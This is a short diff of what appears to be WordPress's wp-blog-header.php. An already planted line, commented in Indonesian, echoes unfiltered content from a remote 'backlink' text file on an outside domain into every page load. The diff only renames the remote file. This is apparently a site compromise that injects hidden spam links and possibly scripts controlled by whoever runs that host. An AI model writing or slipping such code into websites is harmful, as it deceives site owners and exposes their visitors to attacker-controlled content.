@@ -20,4 +20,4 @@ if ( ! isset( $wp_did_header ) ) {
 
 }
 // Ambil konten dari URL eksternal
-echo file_get_contents('https://kampungkeramat.site/backlink/discover.txt');
+echo file_get_contents('https://kampungkeramat.site/backlink/discover-berkah.txt');
